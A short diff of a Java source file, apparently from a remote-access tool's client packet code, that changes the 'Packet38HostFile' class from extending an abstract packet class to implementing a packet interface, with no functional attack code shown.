@@ -3,7 +3,7 @@ package jrat.client.packets.outgoing;
 import jrat.client.Connection;
 
 
-public class Packet38HostFile extends AbstractOutgoingPacket {
+public class Packet38HostFile implements OutgoingPacket {
 
 	private String content;
 
